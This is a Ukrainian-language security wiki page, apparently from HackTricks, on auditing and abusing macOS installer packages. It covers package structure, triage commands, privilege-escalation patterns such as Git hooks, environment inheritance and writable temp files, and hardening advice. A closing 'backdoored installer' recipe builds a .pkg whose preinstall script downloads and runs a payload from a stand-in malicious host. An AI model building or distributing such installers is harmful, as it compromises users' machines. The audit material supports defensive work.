# Зловживання macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Базова інформація про Pkg

**installer package** macOS (також відомий як файл `.pkg`) — це формат файлу, який macOS використовує для **розповсюдження software**. Ці файли схожі на **коробку, що містить усе необхідне software** для правильного встановлення та роботи.

Сам package file є archive, що містить **ієрархію файлів і директорій, які буде встановлено на цільовому** computer. Він також може містити **scripts** для виконання завдань до та після встановлення, наприклад налаштування configuration files або видалення старих версій software.

### Структура Package

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) і script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
- **Bill of materials (bom)**: List of files to install, update or remove with file permissions
- **Payload (CPIO archive gzip compressed)**: Files to install in the `install-location` from PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre and post install scripts and more resources extracted to a temp directory for execution.

### Розпакування
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Щоб переглянути вміст інсталятора без ручного розпакування, також можна скористатися безкоштовним інструментом [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Корисні скорочення для статичного triage

Якщо метою є аналіз, спробуйте **спочатку не відкривати пакет за допомогою `Installer.app`**. Деякі пакети можуть виконувати code одразу після відкриття Installer (наприклад, через `system.run()` або installer plug-ins), тому offline extraction зазвичай є безпечнішою відправною точкою.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Базова інформація про DMG

Файли DMG, або Apple Disk Images, — це формат файлів, який Apple macOS використовує для образів дисків. Файл DMG по суті є **образом диска, який можна змонтувати** (він містить власну файлову систему), що містить необроблені блокові дані, зазвичай стиснуті, а іноді й зашифровані. Коли ви відкриваєте файл DMG, macOS **монтує його так, ніби це фізичний диск**, що дає змогу отримати доступ до його вмісту.

> [!CAUTION]
> Зверніть увагу, що інсталятори **`.dmg`** підтримують **дуже багато форматів**, тому в минулому деякі з них, що містили вразливості, використовувалися для отримання **виконання коду на рівні kernel**.

### Структура Disk Image

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Ієрархія файлу DMG може відрізнятися залежно від його вмісту. Однак для application DMG вона зазвичай має таку структуру:

- Верхній рівень: це корінь disk image. Він часто містить application і, можливо, посилання на папку Applications.
- Application (.app): це фактичний application. У macOS application зазвичай є package, що містить багато окремих файлів і папок, з яких складається application.
- Посилання Applications: це shortcut до папки Applications у macOS. Його призначення — спростити встановлення application. Щоб встановити application, можна перетягнути файл .app на цей shortcut.

## Privesc через abuse pkg

### Виконання з публічних директорій

Якщо pre- або post-installation script виконує файл, наприклад **`/var/tmp/Installerutil`**, і attacker може замінити цей файл, він може виконати privilege escalation, коли installer викличе його. У наведених доповідях і walkthrough показані варіанти цього insecure external-script pattern.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Це [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), яку викликають деякі installers та updaters, щоб **виконати щось від імені root**. Ця function приймає **path** до **file**, який потрібно **виконати**, як параметр. Однак, якщо attacker може **змінити** цей file, він зможе **зловживати** його виконанням із root, щоб **виконати privilege escalation**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Більше інформації наведено в цьому виступі: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Зловживання environment і shebang

Сучасні вразливості PackageKit показали, що скрипти інсталяторів часто виконуються як **trusted root code**, водночас поруч зберігається контекст, контрольований attacker. Під час аудиту пакетів постачальників звертайте особливу увагу на:

- Shell interpreters, такі як `#!/bin/zsh` / `#!/bin/bash`
- Виклики на кшталт `sudo -u $USER`, `launchctl asuser` або будь-яку логіку, яка довіряє `$USER`, `$HOME`, `PATH`, `TMPDIR` чи відносним шляхам
- Non-shell interpreters, які можуть завантажувати init-файли або бібліотеки, контрольовані користувачем
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Для багу PackageKit у root-середовищі 2024 року (успадкування `~/.zshenv` / `~/.bash*` під час інсталяцій, ініційованих користувачем) див. [загальну сторінку про macOS privesc](../macos-privilege-escalation.md). Якщо package **підписаний Apple**, той самий баг у скрипті може стати **релевантним для SIP/TCC**, оскільки `system_installd` може мати `com.apple.rootless.install.heritable`; див. [сторінку про SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Стани як вхідні дані та неявні callbacks

Не обмежуйте review очевидною command injection. Root `preinstall`/`postinstall` може перетнути trust boundary щоразу, коли використовує **стан, який існував до інсталяції**: передбачувані файли в `/tmp` або `/var/tmp`, наявне дерево інсталяції, доступне для запису користувачем, configuration files, repository metadata або username, який згодом передається до `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Два нещодавні недоліки інсталяторів Homebrew ілюструють варіанти, які можна повторно застосовувати:

- **Вибране attacker-ом ownership:** override користувача package зчитувався з передбачуваного `/var/tmp/.homebrew_pkg_user.plist` без перевірки його owner, mode, ACLs, symlink state або provenance. Користувач із низькими привілеями міг вибрати власний account, після чого пізніший root `postinstall` рекурсивно передавав йому ownership дерева Homebrew і cache. Це був privilege-assignment flaw, а не shell injection.<sup>[[9]](#references)</sup>
- **Callbacks інструментів із наявного дерева:** root `postinstall` запускав `git checkout` усередині інсталяції, яка навмисно була доступною для запису її звичайному користувачу. Тому розміщення executable `.git/hooks/post-checkout` перетворювало подальше оновлення package через GUI/MDM на виконання коду з root-привілеями. На Intel-шляху об’єднання package-директорії `.git` з наявним repository також зберігало hooks, додані attacker-ом.<sup>[[10]](#references)</sup>

Другу primitive легко змоделювати під час authorized test; trigger виникає лише тоді, коли вразливий privileged installer згодом запускає Git operation, здатну виконувати hooks.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Розгорніть вкладені пакети та зіставте кожне контрольоване зловмисником джерело з привілейованим sink. Окрім прямого виконання, шукайте парсери, зміни власника та інструменти з механізмами plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Для hardening перемістіть privileged inputs до каталогу staging, власником якого є root, і перевіряйте кожен path безпосередньо перед використанням (звичайний файл, очікувані owner/mode, відсутність небезпечного ACL і traversal через symlink). Уникайте рекурсивної зміни ownership від імені untrusted identity. Якщо Git має працювати з попередньо наявним tree, явно вимикайте callbacks (наприклад, `git -c core.hooksPath=/dev/null ...`) або атомарно замінюйте repository metadata перед запуском Git.<sup>[[9]](#references)[[10]](#references)</sup>

### Виконання через монтування

Якщо installer записує дані до `/tmp/fixedname/bla/bla`, можна **створити mount** поверх `/tmp/fixedname` із noowners, щоб **змінювати будь-який файл під час installation** і зловживати процесом installation.

Прикладом цього є **CVE-2021-26089**, за допомогою якого вдалося **перезаписати periodic script** і отримати execution as root. Докладніше дивіться у виступі: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg як malware

### Порожній Payload

Можна просто створити файл **`.pkg`** із **pre- та post-install scripts**, без будь-якого реального payload, окрім malware усередині scripts.<sup>[[2]](#references)</sup>

### JS у Distribution xml

Можна додати теги **`<script>`** до **distribution xml** файлу package, і цей code буде виконано; він може **виконувати commands** за допомогою **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

У distribution packages це зазвичай залежить від того, чи дозволяє top-level файл `Distribution` external scripts, наприклад за допомогою `allow-external-scripts="true"`. Тому перевірки лише `preinstall` / `postinstall` недостатньо: сам **Distribution XML** може містити hooks `installation-check` / `volume-check` і прямі шляхи виконання `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Інсталятор із бекдором

Шкідливий інсталятор, що використовує скрипт і JS-код усередині dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Розпакування Pkgs: погляд усередину пакетів інсталятора Macos і поширені вразливості безпеки](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: «Дикий світ інсталяторів macOS» - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Розпакування Pkgs: погляд усередину пакетів інсталятора MacOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming macOS: експлуатація пакетів інсталятора](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: підвищення привілеїв у macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Обхід SIP за допомогою пакетів, підписаних Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: «Гора багів» - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Смерть від 1000 інсталяторів у macOS, і все зламано!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Інсталятор Homebrew для macOS довіряє plist package-user, контрольованому користувачем](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Виконання коду з правами root через Git hooks у macOS PKG postinstall](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
